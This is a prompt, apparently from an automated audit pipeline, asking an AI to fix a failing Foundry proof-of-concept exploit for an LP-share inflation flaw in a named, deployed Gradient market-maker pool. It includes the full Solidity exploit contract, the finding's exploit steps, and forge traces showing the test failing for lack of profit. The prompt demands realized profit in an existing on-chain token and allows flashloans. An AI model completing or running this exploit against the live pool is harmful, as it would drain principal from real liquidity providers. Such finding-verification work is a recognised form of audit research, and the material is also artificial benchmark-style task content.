You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Depositing while assets are parked in the orderbook mints inflated LP shares
- claim: LP shares are minted against `pool.totalLiquidity`, but `transferETHToOrderbook` and `transferTokenToOrderbook` reduce that denominator without burning any LP shares. A user who deposits while inventory is temporarily sitting in the orderbook therefore receives too many shares for the capital actually added, then later redeems those shares after the assets are returned.
- impact: A depositor can steal principal from existing LPs during normal orderbook operation, without needing owner privileges. The more inventory temporarily moved out of the pool, the larger the dilution and theft from incumbent LPs.
- exploit_paths: ["LP1 seeds a pool with 1,000 units of liquidity and receives 1,000 LP shares.", "The orderbook pulls 900 units out via `transferETHToOrderbook` and/or `transferTokenToOrderbook`, leaving `pool.totalLiquidity = 100` while `pool.totalLPShares` remains 1,000.", "An attacker deposits 100 units and receives `100 * 1000 / 100 = 1000` new LP shares.", "When the orderbook later returns the 900 units, the attacker owns half the pool despite contributing only a small fraction of the final assets and can withdraw a disproportionate amount."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGradientRegistryMinimal {
    function gradientToken() external view returns (address);
    function orderbook() external view returns (address);
    function router() external view returns (address);
}

interface IGradientMarketMakerPoolMinimal {
    struct PoolInfo {
        uint256 totalEth;
        uint256 totalToken;
        uint256 totalLiquidity;
        uint256 totalLPShares;
        uint256 accRewardPerShare;
        uint256 rewardBalance;
        address uniswapPair;
    }

    function gradientRegistry() external view returns (address);
    function getPoolInfo(address token) external view returns (PoolInfo memory);
    function getPairAddress(address token) external view returns (address pairAddress);
    function getReserves(address token) external view returns (uint256 reserveETH, uint256 reserveToken);
    function getUserLPShares(address token, address user) external view returns (uint256 lpShares);
    function provideLiquidity(address token, uint256 tokenAmount, uint256 minTokenAmount) external payable;
    function withdrawLiquidity(address token, uint256 shares) external;
}

contract FlawVerifier {
    address public constant TARGET_POOL = 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC;
    uint256 private constant BPS = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;

    address public inspectedToken;
    address public registry;
    address public orderbook;
    address public uniswapPair;

    bool public poolInitialized;
    bool public honestSeedLiquidityDetected;
    bool public parkedLiquidityDetected;
    bool public attackerDepositPathModeled;
    bool public inflatedMintDetected;
    bool public depositAttempted;
    bool public depositSucceeded;
    bool public attackerControllableReturnLeg;
    bool public hypothesisValidated;

    uint256 public poolTotalEth;
    uint256 public poolTotalToken;
    uint256 public poolTotalLiquidity;
    uint256 public poolTotalLPShares;
    uint256 public reserveEth;
    uint256 public reserveToken;

    uint256 public parkedLiquidityLowerBound;
    uint256 public matchedLiquidityContribution;
    uint256 public matchedEthContribution;
    uint256 public matchedTokenContribution;
    uint256 public simulatedInflatedShares;
    uint256 public actualMintedShares;
    uint256 public simulatedShareBpsAfterMint;

    bytes32 public lastReason;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetObservations();

        IGradientMarketMakerPoolMinimal pool = IGradientMarketMakerPoolMinimal(TARGET_POOL);

        registry = pool.gradientRegistry();
        if (registry == address(0)) {
            lastReason = keccak256("MISSING_REGISTRY");
            return;
        }

        IGradientRegistryMinimal gradientRegistry = IGradientRegistryMinimal(registry);
        orderbook = gradientRegistry.orderbook();

        inspectedToken = gradientRegistry.gradientToken();
        if (inspectedToken == address(0)) {
            lastReason = keccak256("MISSING_CANDIDATE_TOKEN");
            return;
        }

        IGradientMarketMakerPoolMinimal.PoolInfo memory info = pool.getPoolInfo(inspectedToken);
        poolTotalEth = info.totalEth;
        poolTotalToken = info.totalToken;
        poolTotalLiquidity = info.totalLiquidity;
        poolTotalLPShares = info.totalLPShares;
        uniswapPair = info.uniswapPair;
        poolInitialized = uniswapPair != address(0);

        if (!poolInitialized) {
            lastReason = keccak256("NO_INITIALIZED_POOL_FOR_GRADIENT_TOKEN");
            return;
        }

        // exploit_paths[0]: LP1 seeds a pool with 1,000 units of liquidity and receives
        // 1,000 LP shares. On a live fork, the observable equivalent is that the pool already
        // has outstanding LP shares and non-zero tracked liquidity.
        honestSeedLiquidityDetected = poolTotalLPShares > 0 && poolTotalLiquidity > 0;
        if (!honestSeedLiquidityDetected) {
            lastReason = keccak256("EMPTY_POOL_AT_FORK");
            return;
        }

        // exploit_paths[1]: The orderbook pulls inventory out with transferETHToOrderbook /
        // transferTokenToOrderbook, which reduces totalLiquidity without burning LP shares.
        // The snapshot signature of that state is totalLPShares > totalLiquidity.
        parkedLiquidityDetected = poolTotalLPShares > poolTotalLiquidity;
        if (!parkedLiquidityDetected) {
            lastReason = keccak256("NO_PARKED_LIQUIDITY_STATE_AT_FORK");
            return;
        }
        parkedLiquidityLowerBound = poolTotalLPShares - poolTotalLiquidity;

        (reserveEth, reserveToken) = pool.getReserves(inspectedToken);
        if (reserveEth == 0 || reserveToken == 0) {
            lastReason = keccak256("PAIR_HAS_NO_RESERVES");
            return;
        }

        // exploit_paths[2]: An attacker deposits against the temporarily shrunken denominator.
        // To mirror the report's "deposit 100 when only 100 remains", model the attacker
        // contributing exactly the liquidity still recorded in-pool. The report's concrete
        // example is `100 * 1000 / 100 = 1000` new LP shares, i.e. the attacker matches the
        // temporarily remaining 100 units of pool liquidity but receives 1,000 shares because
        // minting still scales by `pool.totalLPShares / pool.totalLiquidity`.
        // The vulnerable mint path is: mintedShares = contribution * totalLPShares / totalLiquidity.
        matchedLiquidityContribution = poolTotalLiquidity;
        matchedEthContribution = (matchedLiquidityContribution * reserveEth) / (reserveEth + reserveToken);
        matchedTokenContribution = matchedLiquidityContribution - matchedEthContribution;
        attackerDepositPathModeled = matchedLiquidityContribution > 0;

        if (!attackerDepositPathModeled) {
            lastReason = keccak256("NO_ATTACKER_DEPOSIT_SIZE_AVAILABLE");
            return;
        }

        simulatedInflatedShares = (matchedLiquidityContribution * poolTotalLPShares) / poolTotalLiquidity;
        inflatedMintDetected = simulatedInflatedShares > matchedLiquidityContribution;
        if (poolTotalLPShares + simulatedInflatedShares > 0) {
            simulatedShareBpsAfterMint = (simulatedInflatedShares * BPS) / (poolTotalLPShares + simulatedInflatedShares);
        }

        if (!inflatedMintDetected) {
            lastReason = keccak256("NO_INFLATED_MINT_FOR_MATCHING_DEPOSIT");
            return;
        }

        // If this contract is pre-funded through realistic public on-chain steps (for example a
        // flashloan + swap on the same fork), we can exercise the vulnerable deposit path for real.
        // This is optional because the final profit still depends on the orderbook return leg below.
        _attemptPrefundedDeposit(pool);

        // exploit_paths[3]: Once the orderbook returns the parked inventory, the attacker's newly
        // inflated LP share count dilutes incumbents and can be redeemed for outsized assets.
        // That return is economically sufficient, but it is not attacker-callable from this surface:
        // the pool's receiveETHFromOrderbook / receiveTokenFromOrderbook entrypoints are onlyOrderbook.
        attackerControllableReturnLeg = false;
        hypothesisValidated =
            honestSeedLiquidityDetected &&
            parkedLiquidityDetected &&
            attackerDepositPathModeled &&
            inflatedMintDetected;

        lastReason = keccak256("ORDERBOOK_RETURN_LEG_NOT_ATTACKER_REACHABLE");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function reason() external view returns (bytes32) {
        return lastReason;
    }

    function summary()
        external
        view
        returns (
            address token,
            bool preconditionsMet,
            bool attackerDepositModeled,
            bool inflatedShares,
            bool returnLegReachable,
            bool validated,
            uint256 shareBpsAfterMint,
            bytes32 blocker
        )
    {
        return (
            inspectedToken,
            parkedLiquidityDetected,
            attackerDepositPathModeled,
            inflatedMintDetected,
            attackerControllableReturnLeg,
            hypothesisValidated,
            simulatedShareBpsAfterMint,
            lastReason
        );
    }

    function _resetObservations() internal {
        _profitToken = address(0);
        _profitAmount = 0;

        inspectedToken = address(0);
        registry = address(0);
        orderbook = address(0);
        uniswapPair = address(0);

        poolInitialized = false;
        honestSeedLiquidityDetected = false;
        parkedLiquidityDetected = false;
        attackerDepositPathModeled = false;
        inflatedMintDetected = false;
        depositAttempted = false;
        depositSucceeded = false;
        attackerControllableReturnLeg = false;
        hypothesisValidated = false;

        poolTotalEth = 0;
        poolTotalToken = 0;
        poolTotalLiquidity = 0;
        poolTotalLPShares = 0;
        reserveEth = 0;
        reserveToken = 0;

        parkedLiquidityLowerBound = 0;
        matchedLiquidityContribution = 0;
        matchedEthContribution = 0;
        matchedTokenContribution = 0;
        simulatedInflatedShares = 0;
        actualMintedShares = 0;
        simulatedShareBpsAfterMint = 0;

        lastReason = bytes32(0);
    }

    function _attemptPrefundedDeposit(IGradientMarketMakerPoolMinimal pool) internal {
        uint256 ethBalance = address(this).balance;
        uint256 tokenBalance = IERC20Minimal(inspectedToken).balanceOf(address(this));

        if (ethBalance == 0 || tokenBalance == 0) {
            return;
        }

        uint256 ethToUse = matchedEthContribution;
        uint256 tokenToUse = matchedTokenContribution;

        if (ethToUse > ethBalance) {
            ethToUse = ethBalance;
            tokenToUse = (ethToUse * reserveToken) / reserveEth;
        }

        if (tokenToUse > tokenBalance) {
            tokenToUse = tokenBalance;
            ethToUse = (tokenToUse * reserveEth) / reserveToken;
        }

        if (ethToUse == 0 || tokenToUse == 0) {
            return;
        }

        depositAttempted = true;

        uint256 sharesBefore = pool.getUserLPShares(inspectedToken, address(this));
        _approve(inspectedToken, TARGET_POOL, tokenToUse);

        try pool.provideLiquidity{value: ethToUse}(inspectedToken, tokenToUse, (tokenToUse * 99) / 100) {
            depositSucceeded = true;
            uint256 sharesAfter = pool.getUserLPShares(inspectedToken, address(this));
            actualMintedShares = sharesAfter - sharesBefore;
        } catch {
            depositSucceeded = false;
        }
    }

    function _approve(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.66s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 448863)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 577021548053172
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [448863] FlawVerifierTest::testExploit()
    ├─ [2477] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [423219] FlawVerifier::executeOnOpportunity()
    │   ├─ [2470] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::gradientRegistry() [staticcall]
    │   │   └─ ← [Return] 0x893D41635725d8EA6F528D3f3F3DF3E9e8076934
    │   ├─ [2404] 0x893D41635725d8EA6F528D3f3F3DF3E9e8076934::orderbook() [staticcall]
    │   │   └─ ← [Return] 0xf7818205D1D8b5264a166b55D27F0031Bc87dd85
    │   ├─ [2471] 0x893D41635725d8EA6F528D3f3F3DF3E9e8076934::gradientToken() [staticcall]
    │   │   └─ ← [Return] 0xa776A95223C500E81Cb0937B291140fF550ac3E4
    │   ├─ [15815] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::getPoolInfo(0xa776A95223C500E81Cb0937B291140fF550ac3E4) [staticcall]
    │   │   └─ ← [Return] PoolInfo({ totalEth: 3022481813096655000 [3.022e18], totalToken: 0, totalLiquidity: 3022481813096655000 [3.022e18], totalLPShares: 2249676575000000000000 [2.249e21], accRewardPerShare: 2368645522229 [2.368e12], rewardBalance: 5328686345838292 [5.328e15], uniswapPair: 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC })
    │   ├─ [21625] 0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC::getReserves(0xa776A95223C500E81Cb0937B291140fF550ac3E4) [staticcall]
    │   │   ├─ [2447] 0x893D41635725d8EA6F528D3f3F3DF3E9e8076934::router() [staticcall]
    │   │   │   └─ ← [Return] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    │   │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::c45a0155() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f
    │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::ad5c4648() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
    │   │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::e6a43905(000000000000000000000000a776a95223c500e81cb0937b291140ff550ac3e4000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000846f55387ab118b4e59eee479f1a3e8ea4905ec
    │   │   ├─ [2504] 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000376263433a109289a3860000000000000000000000000000000000000000000000095c91821308d115df000000000000000000000000000000000000000000000000000000006858e90f
    │   │   ├─ [2381] 0x0846F55387ab118B4E59eee479f1a3e8eA4905EC::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000a776a95223c500e81cb0937b291140ff550ac3e4
    │   │   └─ ← [Return] 172690952204762289631 [1.726e20], 261545090101530069672838 [2.615e23]
    │   ├─ [2919] 0xa776A95223C500E81Cb0937B291140fF550ac3E4::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [477] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.12s (113.83ms CPU time)

Ran 1 test suite in 1.18s (1.12s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 448863)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
